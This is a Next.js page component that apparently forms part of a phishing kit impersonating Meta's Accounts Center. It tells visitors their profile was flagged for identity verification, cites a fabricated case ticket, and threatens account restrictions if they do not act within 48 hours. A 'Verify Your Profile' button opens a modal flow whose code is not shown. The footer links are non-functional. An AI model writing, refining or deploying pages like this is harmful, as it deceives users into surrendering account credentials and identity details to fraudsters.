import { ModalFlowProvider } from "@/components/ModalFlow";
import { ButtonWithModal } from "@/components/ButtonWithModal";
import Image from "next/image";
import type { Metadata } from "next";

export const metadata: Metadata = {
  title: "Accounts Center | Profile Identity Verification",
  description: "Official identity verification and profile security review portal.",
  alternates: {
    canonical: "/accounts-center",
  },
};

export default function AccountsCenterPage() {
  return (
    <ModalFlowProvider>
      <div className="min-h-screen bg-gradient-to-br from-slate-50 via-sky-50 to-slate-100 text-slate-900">
        <main className="mx-auto flex min-h-screen max-w-4xl flex-col px-4 py-10 sm:px-8">
          <section className="flex-1 px-1 py-2 sm:px-2 sm:py-4">
            <div className="mb-6 flex items-start gap-4 sm:mb-10">
              <div className="mt-1 flex h-12 w-12 items-center justify-center rounded-full bg-metaBlue/10">
                <Image
                  src="/ic_blue.svg"
                  alt="Identity Verification"
                  width={40}
                  height={40}
                  className="h-8 w-8"
                />
              </div>
              <div>
                <h1 className="text-2xl font-semibold tracking-tight sm:text-3xl">
                  Action Required: Verify Your Profile Identity
                </h1>
                <p className="mt-2 text-sm font-semibold text-slate-800">
                  Comprehensive profile confirmation and account integrity compliance review.
                </p>
              </div>
            </div>

            <div className="space-y-4 text-sm leading-relaxed text-slate-700 sm:text-base">
              <p>
                To maintain a safe and reliable environment across our global network, we routinely conduct security checks requiring account administrators to confirm and validate their registered profile details. Our automated monitoring system has flagged your profile for scheduled identity verification to ensure your information complies with updated community integrity policies.
              </p>

              <p>
                Completing this standard confirmation step protects your profile from unauthorized access, prevents potential impersonation attempts, and ensures uninterrupted management privileges across all linked assets, business entities, and communication channels.
              </p>

              <p className="mt-4 text-sm font-medium text-metaBlue">
                Case Ticket ID: <span className="underline decoration-dotted">#VRF-9824-IDENTITY-SEC</span>
              </p>

              <div className="mt-6 space-y-3">
                <h2 className="text-sm font-semibold text-slate-900 sm:text-base">
                  Profile Verification Steps &amp; Guidelines
                </h2>

                <ul className="space-y-3 text-sm text-slate-700 sm:text-[15px]">
                  <li>
                    • <strong>Accuracy of Submitted Data:</strong> Ensure all full legal names, business identifiers, and contact channels correspond directly with the credentials associated with this account. Incomplete entries or conflicting identifiers may lead to automated review delays or case rejection.
                  </li>

                  <li>
                    • <strong>Response Window &amp; Case Expiration:</strong> Once initiated, please finalize the required steps promptly. Cases pending without confirmation may trigger automated security limitations on profile activities. Cases inactive beyond 48 hours will be terminated, requiring a re-submission.
                  </li>

                  <li>
                    • <strong>Automated &amp; Specialized Assessment:</strong> Following submission, your profile will be securely assessed against standard safety benchmarks. Most profile evaluations complete within 24 to 48 hours. Once identity confirmation is concluded, full status indicators and profile stability badges will remain intact.
                  </li>
                </ul>
              </div>
            </div>

            <div className="mt-10 flex justify-center">
              <ButtonWithModal className="inline-flex items-center rounded-full bg-metaBlue px-10 py-3 text-sm font-semibold text-white shadow-sm transition hover:bg-metaIndigo focus-visible:outline-none focus-visible:ring-2 focus-visible:ring-metaBlue focus-visible:ring-offset-2">
                Verify Your Profile
              </ButtonWithModal>
            </div>
          </section>

          <footer className="mt-6 flex flex-wrap justify-center gap-4 text-xs text-slate-500 sm:text-[13px]">
            <button className="hover:text-slate-700" type="button">
              Help Center
            </button>
            <span className="text-slate-400">|</span>
            <button className="hover:text-slate-700" type="button">
              Privacy Policy
            </button>
            <span className="text-slate-400">|</span>
            <button className="hover:text-slate-700" type="button">
              Terms of Service
            </button>
            <span className="text-slate-400">|</span>
            <button className="hover:text-slate-700" type="button">
              Community Standards
            </button>
            <span className="text-slate-400">|</span>
            <span>Meta © 2026</span>
          </footer>
        </main>
      </div>
    </ModalFlowProvider>
  );
}